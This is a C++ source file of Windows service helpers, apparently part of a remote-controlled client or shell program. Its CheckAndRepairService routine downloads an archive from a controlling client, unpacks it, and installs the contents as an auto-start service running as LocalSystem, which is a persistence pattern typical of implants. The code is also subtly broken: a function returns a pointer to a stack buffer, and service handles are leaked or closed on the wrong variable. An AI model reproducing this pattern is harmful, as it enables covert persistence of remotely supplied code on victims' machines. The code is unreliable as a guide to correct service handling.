#include "serviceutils.h"
#include "client.h"

bool Service::ServiceExists(LPCSTR lpServiceName) {
	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, GENERIC_READ);
	SC_HANDLE hService = OpenService(hManager, lpServiceName, GENERIC_READ);
	CloseServiceHandle(hManager);
	//if service exists it returns a valid handle
	if (hService != NULL) {
		CloseServiceHandle(hService);
		return true;
	}
	return false;
}

void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
{
	SC_HANDLE scm = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
	if (scm == NULL)
		return;

	SC_HANDLE hService = OpenService(scm, lpServiceName, GENERIC_READ);
	if (hService == NULL)
	{
		CloseServiceHandle(scm);
		return;
	}

	SERVICE_STATUS status;
	LPSERVICE_STATUS pstatus = &status;
	if (QueryServiceStatus(hService, pstatus) == 0)
	{
		CloseServiceHandle(hService);
		CloseServiceHandle(scm);
		return;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(scm);


	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hManager == NULL) {
		CloseServiceHandle(hManager);
		return;
	}
	hService = OpenService(hManager, lpServiceName, SC_MANAGER_ALL_ACCESS);
	if (hService == NULL)
	{
		CloseServiceHandle(scm);
		return;
	}

	//If the service is paused
	if (status.dwCurrentState == SERVICE_PAUSED) {
		ControlService(hService, SERVICE_CONTROL_CONTINUE, &status);
	}
	else if (status.dwCurrentState == SERVICE_STOPPED) {
		StartService(hService, 0, NULL);
	}
}


void Service::CheckAndRepairService()
{
	if (!Service::ServiceExists(SERVICE_NAME)) {
		//Download service archive
		int i = 0;
		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME))) {
			if (i > 9)
				return;
			Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME));
			i++;
		}
		//Wait for file existence
		while (GetFileAttributesA(SHELL_PATH(SERVICE_ARCHIVE_NAME)) == INVALID_FILE_ATTRIBUTES) {
			Sleep(100);
		}
		//Unzip archive
		while (!unzip(std::string(SHELL_PATH(SERVICE_ARCHIVE_NAME)), GetCWD())) {
			Sleep(1000);
		}
		//Delete archive
		remove((SHELL_PATH(SERVICE_ARCHIVE_NAME)));
		//Create service
		while (!InstallService(SERVICE_NAME, SHELL_PATH(SERVICE_FILE_NAME))) {
			Sleep(1000);
		}
	}

	//Start the service
	Service::StartServiceIfNeeded(SERVICE_NAME);
}

bool Service::InstallService(LPCSTR lpServiceName, LPCSTR lpServicePath)
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		return false;
	}

	// Create the service

	schService = CreateService(
		schSCManager,              // SCM database 
		lpServiceName,                   // name of service 
		SERVICE_DISPLAY_NAME,                   // service name to display 
		SERVICE_ALL_ACCESS,        // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START,      // start type 
		SERVICE_ERROR_NORMAL,      // error control type 
		lpServicePath,                    // path to service's binary 
		NULL,                      // no load ordering group 
		NULL,                      // no tag identifier 
		NULL,                      // no dependencies 
		NULL,                      // LocalSystem account 
		NULL);                     // no password 

	if (schService == NULL)
	{
		CloseServiceHandle(schSCManager);
		return false;
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
	return true;
}



//Small utility functions

std::string GetCWD() {
	WCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, buffer, MAX_PATH);
	std::wstring ws(buffer);
	std::string file_path(ws.begin(), ws.end());
	std::wstring::size_type pos = file_path.find_last_of("\\/");
	return file_path.substr(0, pos + 1);
}

CHAR* ExePathA()
{
	CHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	return buffer;
}